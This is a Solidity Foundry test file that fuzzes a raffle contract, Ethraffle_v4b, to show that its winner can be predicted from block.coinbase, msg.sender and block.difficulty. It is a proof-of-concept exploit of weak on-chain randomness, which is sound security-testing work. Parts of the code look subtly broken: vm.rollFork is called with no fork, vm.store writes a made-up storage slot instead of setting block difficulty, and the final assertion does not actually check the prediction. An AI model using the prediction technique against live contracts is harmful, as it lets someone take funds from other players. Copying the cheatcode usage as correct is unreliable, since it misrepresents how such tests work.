
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/Ethraffle_v4b.sol";

contract TestWeakRandomnessEthraffle_v4b is Test {

    Ethraffle_v4b public raffle;

    function setUp() public {
        raffle = new Ethraffle_v4b();
    }

    function test_highlightPredictableRandomValue(address blockCoinbase, address msgSender, uint blockDifficulty) public {
        // --- 1. Constraints ---
        blockCoinbase = address(uint160(uint256(blockCoinbase) % 50));
        msgSender = address(uint160(uint256(msgSender) % 50));
        blockDifficulty = blockDifficulty % 50;

        // --- 2. State Configuration ---
        vm.deal(address(this), 2.5 ether);
        vm.deal(address(raffle), 2.5 ether);

        // --- 3. Replication & Assertion ---
        // PREDICT THE OUTCOME
        address seed1 = address(uint160(uint256(blockCoinbase) % 50));
        address seed2 = address(uint160(uint256(msgSender) % 50));
        uint seed3 = blockDifficulty;
        bytes32 randHash = keccak256(abi.encodePacked(seed1, seed2, seed3));
        uint winningNumber = uint(randHash) % 50;

        // MANIPULATE BLOCK ENVIRONMENT
        vm.coinbase(blockCoinbase);
        vm.prank(msgSender);
        vm.roll(block.number + 1);
        vm.rollFork(block.number + 1);
        vm.store(address(raffle), bytes32(uint256(keccak256("block.difficulty")) - 1), bytes32(blockDifficulty));

        // EXECUTE
        raffle.buyTickets{value: 2.5 ether}();

        // ASSERT PREDICTABILITY
        emit log_named_uint("Predicted Winning Number", winningNumber);
        emit log_named_uint("Actual Winning Number", raffle.contestants(winningNumber).raffleId);
        assertEq(winningNumber, raffle.contestants(winningNumber).raffleId);
    }
}
